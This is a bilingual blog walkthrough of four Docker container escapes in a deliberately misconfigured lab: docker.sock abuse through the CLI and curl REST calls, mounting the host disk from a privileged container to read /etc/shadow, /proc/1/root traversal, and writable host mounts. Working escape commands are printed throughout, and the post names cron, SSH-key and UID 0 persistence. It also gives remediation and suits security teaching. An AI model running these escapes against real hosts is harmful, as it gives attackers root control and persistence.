---
layout: post
title: "Docker Container Escape: four breakouts from scratch"
date: 2026-11-25
author: Nguyen Nam Khanh
tags: [docker, container-escape, linux, namespaces, capabilities, devops, cgroups, walkthrough]
description: >
  A technical walkthrough of four Docker container escape vectors tested on a local
  Compose lab: mounted daemon sockets, privileged block-device access, shared host
  PID traversal, and writable host volumes, alongside remediation steps.
platform: Docker / Linux
difficulty: Intermediate
flags: 4
flags_label: Escapes
read: 12
bilingual: true
image: /images/docker-escape-lab/00-isolation-architecture.png
---

<div class="lang-en" markdown="1">

> Lab use only. All targets below run inside an intentionally misconfigured Docker Compose
> environment on an isolated host. Never apply these techniques against systems without
> explicit authorization.

A Linux container shares the host kernel. Process isolation relies on three kernel primitives:
namespaces (controlling visibility across processes, mounts, and network interfaces), cgroups
(capping CPU, memory, and I/O consumption), and Linux capabilities paired with Seccomp and
AppArmor (restricting allowed syscalls and file operations). Whenever a deployment weakens
one of these boundaries, a process running inside the container can cross back onto the host.

Most real-world container breakouts do not depend on zero-day kernel exploits. They stem from
common configuration shortcuts: exposing the Docker daemon socket inside a CI runner, enabling
`--privileged` to bypass device errors, sharing the host PID namespace for monitoring, or
mounting sensitive host directories as read-write volumes.

| # | Challenge | Misconfiguration | Breakout vector |
|---|---|---|---|
| 1 | Docker daemon socket | `-v /var/run/docker.sock:...` | Spawn a host-mounted container and `chroot` |
| 2 | Privileged mode | `privileged: true` | Mount the host block device (`/dev/sda`) directly |
| 3 | Shared host PID | `pid: host` + `SYS_PTRACE` | Traverse host rootfs through `/proc/1/root` |
| 4 | Host volume mount | `-v /:/host:rw` | Modify host cron schedules or SSH authorized keys |

![Container isolation boundaries and four escape vectors across the shared host kernel]({{ '/images/docker-escape-lab/00-isolation-architecture.png' | relative_url }})

---

## Run it yourself

The reproducible lab launches with a single Compose command:

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Verify that all four target containers are active:

{% raw %}
```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```
{% endraw %}

![Four lab target containers running after docker compose up -d]({{ '/images/docker-escape-lab/01-lab-containers-up.png' | relative_url }})

Each container stores a flag file (`/flag1.txt` through `/flag4.txt`) on minimal Alpine
Linux to verify entry before testing the breakout steps.

---

## Recon

Before attempting any breakout, inspect the boundaries visible from inside an unprivileged
container versus the misconfigured targets. In a properly isolated container, `/dev` contains
only minimal virtual nodes (`null`, `zero`, `random`, `pts`), `ps aux` shows only the
container's own PID 1, and `/var/run/docker.sock` is absent. Checking `mount`, `ls /dev`,
`ps aux`, and `ls -la /var/run` surfaces exposed privileges immediately.

---

## Challenge 1: Docker daemon socket

Mounting `/var/run/docker.sock` into a container is widespread across Jenkins agents, GitLab CI
runners, and management dashboards such as Portainer. The socket is often treated as a narrow
control channel for managing images or containers. In reality, access to the Docker daemon
socket grants full root privileges over the host, because `dockerd` runs as host root and
honors any container specification sent to it.

Start an interactive shell inside the first target and inspect the socket:

```bash
docker exec -it lab-sock-escape bash
ls -la /var/run/docker.sock
```

```text
srw-rw----    1 root     root             0 Nov 25 01:45 /var/run/docker.sock
```

The leading `s` identifies a Unix domain socket. Inside the container the shell runs as
`uid=0(root)`, providing read and write access to the socket. Running `docker ps` confirms
communication with the host daemon and lists all sibling containers.

From there, instruct the host daemon to launch an ephemeral Alpine container with the host's
root filesystem (`/`) bind-mounted into `/host`, then switch root with `chroot`:

```bash
docker run --rm -it -v /:/host alpine chroot /host
```

Verify the execution context:

```bash
cat /etc/os-release
id
```

```text
PRETTY_NAME="Docker Desktop"
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

![Inspecting /var/run/docker.sock and spawning a chroot host shell]({{ '/images/docker-escape-lab/02-sock-escape.png' | relative_url }})

The shell now operates directly on the host filesystem with root privileges.

If the compromised container lacks the `docker` CLI binary, no external tooling is required.
The daemon exposes an HTTP REST API over the Unix socket, which standard `curl` can query
directly. Check the engine version endpoint first:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

Next, send a container creation request mounting `/` and running an arbitrary command on the
host, then start that container:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  "http://localhost/v1.40/containers/create?name=pwned_sock" \
  -d '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/host"]},"Cmd":["sh","-c","echo pwned > /host/tmp/sock_escape_proof.txt"]}'

curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/pwned_sock/start
```

The host daemon executes the payload without requiring a Docker client inside the container.

---

## Challenge 2: Privileged container

Workloads sometimes receive the `--privileged` flag to support raw network sockets,
Docker-in-Docker, or direct hardware access. Enabling `--privileged` grants the full Linux
capability set (including `CAP_SYS_ADMIN` and `CAP_MKNOD`), removes the default Seccomp syscall
filter, disables AppArmor confinement, and exposes the host's `/dev` device nodes inside the
container.

Open a shell in the second container and inspect available block devices with `lsblk`:

```bash
docker exec -it lab-privileged-escape bash
lsblk
```

```text
NAME  MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0   7:0    0 788.4M  1 loop 
sda     8:0    0 388.4M  1 disk 
sdb     8:16   0     2G  0 disk [SWAP]
sdc     8:32   0     1T  0 disk /etc/resolv.conf
                                /etc/hosts
sde     8:64   0     1T  0 disk 
```

The host's virtual disks (`/dev/sda`, `/dev/sdc`, `/dev/sde`) appear directly in the device
tree. Because `CAP_SYS_ADMIN` permits filesystem mounts, `/dev/sda` can be mounted straight
into a directory inside the container:

```bash
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk
ls -la /mnt/host_disk
```

```text
total 80
drwxr-xr-x   17 root     root          4096 Jan  1  1970 .
drwxr-xr-x    1 root     root          4096 Nov 25 01:46 ..
drwxr-xr-x   41 root     root          4096 Aug 14  2024 etc
drwxr-xr-x    3 root     root          4096 Aug 14  2024 home
drwxr-x---    3 root     root          4096 Jun 15  2024 root
drwxr-xr-x   12 root     root          4096 Jun 15  2024 var
```

This directory exposes the root partition of the underlying host VM. Inspecting
`/etc/os-release` and `/etc/shadow` confirms direct read access to host OS files:

```bash
cat /mnt/host_disk/etc/os-release
head -n 5 /mnt/host_disk/etc/shadow
```

```text
PRETTY_NAME="CBL-Mariner/Linux"
root:x:19949:7:99999:7:::
bin:x:19949:7:99999:7:::
daemon:x:19949:7:99999:7:::
```

![Mounting /dev/sda inside a privileged container and reading host /etc/shadow]({{ '/images/docker-escape-lab/03-privileged-disk-mount.png' | relative_url }})

On older kernels running cgroups v1, a privileged or `CAP_SYS_ADMIN` container can also mount
a cgroup controller and register a host script in `release_agent` to execute as host root
when a child cgroup exits. On Linux 5.15+ with modern runtime defaults, direct block-device
mounting remains the most reliable breakout path.

---

## Challenge 3: Shared host PID namespace

Monitoring agents and eBPF profilers frequently request `--pid=host` to inspect running host
processes. Sharing the host PID namespace removes process-tree isolation: PID 1 inside the
container becomes the host's init process rather than the container entrypoint.

Inspect running processes inside the third container:

```bash
docker exec -it lab-pid-escape bash
ps aux | head -n 10
```

All host processes are visible. Under Linux `procfs`, `/proc/<PID>/root` is a symbolic link
pointing to the root directory of that process's mount namespace. Because PID 1 belongs to the
host, `/proc/1/root` resolves to the host's real `/`.

Docker's default AppArmor profile blocks access to `/proc/1/root` from inside a container.
However, when debugging capabilities such as `SYS_PTRACE` are added alongside an unconfined
profile, that restriction is lifted:

```bash
ls -la /proc/1/root/
head -n 5 /proc/1/root/etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

![Viewing host PID 1 and reading host /etc/passwd through /proc/1/root]({{ '/images/docker-escape-lab/04-pid-host-proc-root.png' | relative_url }})

Host configuration files such as `/etc/passwd` become readable without calling `mount`. Any
write operation under `/proc/1/root/` modifies the host filesystem directly.

---

## Challenge 4: Sensitive host volume mount

Backup utilities or diagnostic containers are sometimes deployed with `/` or `/etc` mounted
read-write (`rw`) to inspect configurations or collect logs. Inside `lab-volume-escape`,
`/host` maps directly to the host root directory:

```bash
docker exec -it lab-volume-escape sh
ls -la /host
echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
```

![Writing directly to the host filesystem through a writable volume mount]({{ '/images/docker-escape-lab/05-volume-mount-escape.png' | relative_url }})

Converting a host filesystem write primitive into host command execution follows three
common paths:

1. Scheduled cron task: write a job under `/host/etc/cron.d/pwn_cron` (`* * * * * root ...`), which the host cron daemon executes as root within one minute.
2. SSH key injection: append a public key to `/host/root/.ssh/authorized_keys` to authenticate via SSH as root.
3. Local superuser account: append a UID 0 entry with a valid password hash to `/host/etc/passwd`.

---

## Impact

Each of the four misconfigurations defeats container isolation and allows root-level file
access or arbitrary command execution on the underlying host.

| Challenge | Prerequisite | Impact | Severity |
|---|---|---|---|
| Docker daemon socket | Container root + mounted `docker.sock` | Arbitrary container creation with host `/` mounted | Critical |
| Privileged container | `privileged: true` | Direct host disk mount and filesystem read/write | Critical |
| Shared host PID | `pid: host` + `SYS_PTRACE` / unconfined | Host rootfs traversal via `/proc/1/root` | High |
| Host volume mount | Sensitive host path mounted `rw` | Direct host file modification and cron/SSH RCE | Critical |

---

## Remediation

Every breakout above relies on privileges or mounts that standard application containers do
not require. Hardening involves enforcing least privilege across both runtime flags and
daemon configuration:

| Vector | Remediation |
|---|---|
| Docker daemon socket | Never mount `/var/run/docker.sock` into application workloads or untrusted CI runners. Use rootless builders such as Kaniko or Buildah for image builds, or place `tecnativa/docker-socket-proxy` in front of the socket restricted to read-only `GET` endpoints. |
| Privileged container | Block `privileged: true` in deployment pipelines and admission policies. Drop all capabilities (`--cap-drop=ALL`) and re-enable only what is strictly required (such as `NET_BIND_SERVICE`), keeping default Seccomp and AppArmor profiles active. |
| Shared host PID | Avoid `pid: host` outside dedicated node-level telemetry, and never combine it with `SYS_PTRACE` or unconfined AppArmor profiles. |
| Host volume mount | Mount only the specific configuration file or data subdirectory needed, and enforce read-only (`:ro`) mounts wherever writes are unnecessary. |
| Baseline hardening | Enable `userns-remap` in `/etc/docker/daemon.json` (or adopt Rootless Docker / Podman) so container UID 0 maps to an unprivileged host UID, and run containers with `--read-only --tmpfs /tmp`. |

---

> Lab repository and compose setup: [github.com/Khanh1916/docker-escape-lab](https://github.com/Khanh1916/docker-escape-lab)

</div>

<div class="lang-vi" markdown="1">

> Toàn bộ kịch bản trong bài được kiểm chứng trên môi trường Docker Compose cấu hình hở
> có chủ đích ở máy lab cá nhân. Không áp dụng những kỹ thuật này lên hệ thống không thuộc
> quyền sở hữu hoặc chưa được cấp phép kiểm thử.

Container Linux dùng chung kernel với máy host chứ không chạy hệ điều hành độc lập như máy ảo.
Cơ chế cô lập của container dựa trên ba lớp kiểm soát của Linux kernel: namespace giới hạn
phạm vi nhìn thấy (tiến trình, cây thư mục, giao diện mạng), cgroup giới hạn mức tiêu thụ
tài nguyên (CPU, RAM, I/O), còn Linux capability kết hợp với Seccomp và AppArmor kiểm soát
những syscall hay thao tác file được phép gọi. Chỉ cần một cấu hình nới lỏng một trong ba
lớp này, tiến trình bên trong container có thể vượt ra ngoài không gian của máy host.

Phần lớn trường hợp thoát container ngoài thực tế không cần đến lỗ hổng zero-day trong
kernel. Nguyên nhân thường đến từ các thiết lập vận hành thiếu chặt chẽ: mount Docker socket
vào runner CI/CD để build image, bật cờ `--privileged` để xử lý nhanh lỗi phần cứng, chia
sẻ PID namespace với host để thu thập metrics, hoặc mount nhầm thư mục hệ thống của host ở
chế độ đọc ghi.

| # | Challenge | Lỗi cấu hình | Cơ chế thoát ra host |
|---|---|---|---|
| 1 | Docker daemon socket | `-v /var/run/docker.sock:...` | Khởi tạo container mới mount `/` của host rồi `chroot` |
| 2 | Chế độ privileged | `privileged: true` | Mount trực tiếp phân vùng ổ đĩa của host (`/dev/sda`) |
| 3 | Dùng chung PID host | `pid: host` + `SYS_PTRACE` | Truy cập rootfs của host thông qua `/proc/1/root` |
| 4 | Mount thư mục host | `-v /:/host:rw` | Ghi đè lịch cron hoặc chèn SSH key trên host |

![Sơ đồ ranh giới cô lập của container và bốn hướng thoát ra host trên cùng kernel]({{ '/images/docker-escape-lab/00-isolation-architecture.png' | relative_url }})

---

## Tự chạy tái lập

Môi trường thực hành gồm bốn container độc lập, khởi chạy trực tiếp bằng Docker Compose:

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Kiểm tra trạng thái các container sau khi khởi động:

{% raw %}
```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```
{% endraw %}

![Bốn container mục tiêu đang chạy sau khi khởi động bằng docker compose up -d]({{ '/images/docker-escape-lab/01-lab-containers-up.png' | relative_url }})

Mỗi container đều đặt sẵn một file flag (`/flag1.txt` đến `/flag4.txt`) trên nền Alpine
Linux tối giản để đối chiếu trước khi thực hiện các bước kiểm chứng.

---

## Recon

Trước khi khai thác, cần đối chiếu sự khác biệt giữa một container cấu hình chuẩn và các
container đang bị hở quyền. Ở container bị cô lập chặt, thư mục `/dev` chỉ chứa một số thiết
bị ảo cơ bản (`null`, `zero`, `random`, `pts`), lệnh `ps aux` chỉ hiển thị tiến trình PID 1
của riêng container đó, và không có quyền truy cập `/var/run/docker.sock`. Kiểm tra nhanh
bằng `mount`, `ls /dev`, `ps aux` và `ls -la /var/run` sẽ phát hiện ngay các thành phần bị
phơi bày từ máy host.

---

## Challenge 1: Docker daemon socket

Việc mount `/var/run/docker.sock` vào container xuất hiện rất phổ biến trong các Jenkins
agent, GitLab CI runner hoặc công cụ quản trị như Portainer. Cấu hình này thường bị hiểu
nhầm là chỉ cấp quyền thao tác với Docker. Về mặt hệ thống, truy cập được vào Docker socket
đồng nghĩa với việc nắm quyền root trên máy host, bởi bản thân `dockerd` chạy dưới quyền
root của máy chủ và thực thi mọi đặc tả container được gửi qua socket.

Mở shell vào container thứ nhất và kiểm tra file socket:

```bash
docker exec -it lab-sock-escape bash
ls -la /var/run/docker.sock
```

```text
srw-rw----    1 root     root             0 Nov 25 01:45 /var/run/docker.sock
```

Ký tự `s` ở đầu xác định đây là Unix domain socket. Shell bên trong container đang chạy với
`uid=0(root)` nên có đủ quyền đọc ghi lên socket này. Chạy `docker ps` xác nhận daemon phản
hồi bình thường và liệt kê toàn bộ các container khác đang chạy trên host.

Từ đây, có thể yêu cầu daemon trên host tạo một container Alpine tạm thời, mount toàn bộ
thư mục gốc `/` của host vào đường dẫn `/host`, sau đó chuyển ngữ cảnh thực thi bằng `chroot`:

```bash
docker run --rm -it -v /:/host alpine chroot /host
```

Kiểm tra lại môi trường sau khi chuyển root:

```bash
cat /etc/os-release
id
```

```text
PRETTY_NAME="Docker Desktop"
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

![Kiểm tra /var/run/docker.sock và mở shell root trên host qua chroot]({{ '/images/docker-escape-lab/02-sock-escape.png' | relative_url }})

Shell lúc này đã nằm trực tiếp trên hệ thống file của máy host với quyền root.

Trong trường hợp container bị chiếm quyền không cài sẵn `docker` CLI, vẫn có thể giao tiếp
với daemon qua HTTP REST API trên Unix socket bằng `curl`. Đầu tiên kiểm tra thông tin
phiên bản Docker Engine:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

Tiếp theo, gửi request tạo container mount `/` của host để ghi file kiểm chứng, rồi khởi chạy
container vừa tạo:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  "http://localhost/v1.40/containers/create?name=pwned_sock" \
  -d '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/host"]},"Cmd":["sh","-c","echo pwned > /host/tmp/sock_escape_proof.txt"]}'

curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/pwned_sock/start
```

Lệnh được thực thi trên filesystem của host thông qua API mà không cần cài đặt thêm công cụ
nào trong container.

---

## Challenge 2: Container chạy chế độ privileged

Cờ `--privileged` thường được thêm vào cấu hình triển khai khi ứng dụng cần tạo raw socket,
chạy Docker-in-Docker hoặc giao tiếp phần cứng. Ở tầng kernel, tùy chọn này mở khóa toàn bộ
tập Linux capability (bao gồm `CAP_SYS_ADMIN` và `CAP_MKNOD`), vô hiệu hóa bộ lọc syscall
Seccomp, tắt cơ chế kiểm soát của AppArmor, đồng thời ánh xạ các block device từ `/dev`
của host vào trong container.

Truy cập container thứ hai và liệt kê danh sách thiết bị lưu trữ bằng `lsblk`:

```bash
docker exec -it lab-privileged-escape bash
lsblk
```

```text
NAME  MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0   7:0    0 788.4M  1 loop 
sda     8:0    0 388.4M  1 disk 
sdb     8:16   0     2G  0 disk [SWAP]
sdc     8:32   0     1T  0 disk /etc/resolv.conf
                                /etc/hosts
sde     8:64   0     1T  0 disk 
```

Các ổ đĩa ảo của host (`/dev/sda`, `/dev/sdc`, `/dev/sde`) hiển thị đầy đủ trong cây thiết
bị. Do container đang giữ quyền `CAP_SYS_ADMIN`, có thể mount trực tiếp phân vùng `/dev/sda`
vào một thư mục bên trong container:

```bash
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk
ls -la /mnt/host_disk
```

```text
total 80
drwxr-xr-x   17 root     root          4096 Jan  1  1970 .
drwxr-xr-x    1 root     root          4096 Nov 25 01:46 ..
drwxr-xr-x   41 root     root          4096 Aug 14  2024 etc
drwxr-xr-x    3 root     root          4096 Aug 14  2024 home
drwxr-x---    3 root     root          4096 Jun 15  2024 root
drwxr-xr-x   12 root     root          4096 Jun 15  2024 var
```

Thư mục vừa mount chính là phân vùng root của máy chủ Docker VM bên dưới. Đọc thử
`/etc/os-release` và `/etc/shadow` để xác nhận quyền truy cập trực tiếp vào file hệ thống
của host:

```bash
cat /mnt/host_disk/etc/os-release
head -n 5 /mnt/host_disk/etc/shadow
```

```text
PRETTY_NAME="CBL-Mariner/Linux"
root:x:19949:7:99999:7:::
bin:x:19949:7:99999:7:::
daemon:x:19949:7:99999:7:::
```

![Mount phân vùng /dev/sda trong container privileged và đọc /etc/shadow của host]({{ '/images/docker-escape-lab/03-privileged-disk-mount.png' | relative_url }})

Trên các hệ thống sử dụng kernel cũ với cgroups v1, container chạy privileged hoặc giữ
`CAP_SYS_ADMIN` còn có thể mount cgroup controller và gán đường dẫn script vào `release_agent`
để kernel host tự chạy script đó dưới quyền root khi cgroup con kết thúc. Với Linux 5.15+ và
cấu hình runtime mới, mount trực tiếp block device là phương án ổn định nhất.

---

## Challenge 3: Dùng chung PID namespace với host

Các công cụ giám sát hệ thống hay profiler dùng eBPF thường cấu hình `--pid=host` để theo dõi
tiến trình trên máy chủ. Khi chia sẻ PID namespace, ranh giới tách biệt cây tiến trình bị
xóa bỏ: tiến trình PID 1 trong container lúc này chính là tiến trình init của máy host.

Kiểm tra danh sách tiến trình từ bên trong container thứ ba:

```bash
docker exec -it lab-pid-escape bash
ps aux | head -n 10
```

Toàn bộ tiến trình trên host đều hiển thị. Trong hệ thống file ảo `procfs` của Linux,
`/proc/<PID>/root` là một symlink trỏ về thư mục gốc của mount namespace mà tiến trình đó
đang thực thi. Do PID 1 thuộc về máy host, đường dẫn `/proc/1/root` sẽ trỏ thẳng về `/` của
hệ điều hành host.

Profile AppArmor mặc định của Docker chặn truy cập vào `/proc/1/root` từ bên trong container.
Tuy nhiên, khi container được cấp thêm capability phục vụ debug như `SYS_PTRACE` cùng với
cấu hình tắt AppArmor, cơ chế chặn này không còn hiệu lực:

```bash
ls -la /proc/1/root/
head -n 5 /proc/1/root/etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

![Quan sát tiến trình PID 1 của host và đọc /etc/passwd qua /proc/1/root]({{ '/images/docker-escape-lab/04-pid-host-proc-root.png' | relative_url }})

File cấu hình của host như `/etc/passwd` có thể đọc trực tiếp mà không cần gọi lệnh `mount`.
Mọi thao tác ghi vào bên trong `/proc/1/root/` đều tác động thẳng xuống ổ đĩa của máy host.

---

## Challenge 4: Mount thư mục nhạy cảm của host

Trong một số tác vụ sao lưu hoặc thu thập log, container được mount trực tiếp `/` hoặc
`/etc` với quyền đọc ghi (`rw`). Khi truy cập `lab-volume-escape`, thư mục `/host` ánh xạ
ngay tới gốc hệ thống của máy chủ:

```bash
docker exec -it lab-volume-escape sh
ls -la /host
echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
```

![Ghi file trực tiếp ra hệ thống file của host thông qua volume mount]({{ '/images/docker-escape-lab/05-volume-mount-escape.png' | relative_url }})

Từ quyền ghi lên hệ thống file của host, có ba hướng phổ biến để đạt mức thực thi mã trên
máy chủ:

1. Đặt tác vụ định kỳ qua cron: tạo file cấu hình tại `/host/etc/cron.d/pwn_cron` (`* * * * * root ...`), dịch vụ cron của host sẽ tự động nạp và thực thi lệnh dưới quyền root trong vòng một phút.
2. Chèn SSH public key: nối khóa công khai vào `/host/root/.ssh/authorized_keys` để đăng nhập SSH trực tiếp vào host bằng tài khoản root.
3. Tạo tài khoản superuser cục bộ: thêm một dòng mới có UID 0 kèm chuỗi hash mật khẩu hợp lệ vào `/host/etc/passwd`.

---

## Impact

Cả bốn lỗi cấu hình đều vô hiệu hóa lớp cô lập của container, cho phép đọc ghi dữ liệu hoặc
thực thi lệnh với đặc quyền root trên máy chủ vật lý.

| Challenge | Điều kiện cần | Ảnh hưởng | Mức độ |
|---|---|---|---|
| Docker daemon socket | Quyền root trong container + mount `docker.sock` | Tạo container tùy ý gắn kèm rootfs của host | Nghiêm trọng |
| Chế độ privileged | Bật `privileged: true` | Mount trực tiếp phân vùng ổ cứng của host để đọc ghi | Nghiêm trọng |
| Dùng chung PID host | `pid: host` + `SYS_PTRACE` / tắt AppArmor | Duyệt toàn bộ cây thư mục host qua `/proc/1/root` | Cao |
| Mount thư mục host | Mount đường dẫn hệ thống ở chế độ `rw` | Chỉnh sửa cấu hình hệ thống, đặt cron hoặc chèn SSH key | Nghiêm trọng |

---

## Remediation

Tất cả các hướng thoát container trên đều bắt nguồn từ việc cấp thừa đặc quyền hoặc ánh xạ
tài nguyên không cần thiết vào môi trường chạy ứng dụng. Quá trình khắc phục tập trung vào
nguyên tắc đặc quyền tối thiểu (least privilege) ở cả cấu hình deploy lẫn daemon:

| Lỗi cấu hình | Biện pháp khắc phục |
|---|---|
| Docker daemon socket | Không mount `/var/run/docker.sock` vào container ứng dụng hay CI runner không tin cậy. Sử dụng công cụ build không cần quyền root như Kaniko hoặc Buildah, hoặc đặt `tecnativa/docker-socket-proxy` phía trước để giới hạn chỉ cho phép các endpoint `GET` chỉ đọc. |
| Chế độ privileged | Chặn cờ `privileged: true` ngay ở bước kiểm tra manifest trong CI và admission policy. Gỡ toàn bộ capability mặc định (`--cap-drop=ALL`), chỉ cấp lại đúng quyền cần thiết như `NET_BIND_SERVICE`, đồng thời duy trì Seccomp và AppArmor. |
| Dùng chung PID host | Hạn chế cấu hình `pid: host` ngoài các agent giám sát chuyên biệt ở tầng node, và không kết hợp cùng `SYS_PTRACE` hay tắt AppArmor. |
| Mount thư mục host | Chỉ mount đúng file cấu hình hoặc thư mục dữ liệu cần dùng, kèm tùy chọn chỉ đọc (`:ro`) đối với những đường dẫn không cần ghi. |
| Tăng cứng tổng thể | Kích hoạt `userns-remap` trong `/etc/docker/daemon.json` (hoặc chuyển sang Rootless Docker / Podman) để UID 0 trong container ánh xạ sang một UID không có đặc quyền trên host, kết hợp chạy container với `--read-only --tmpfs /tmp`. |

---

> Mã nguồn lab và file compose: [github.com/Khanh1916/docker-escape-lab](https://github.com/Khanh1916/docker-escape-lab)

</div>
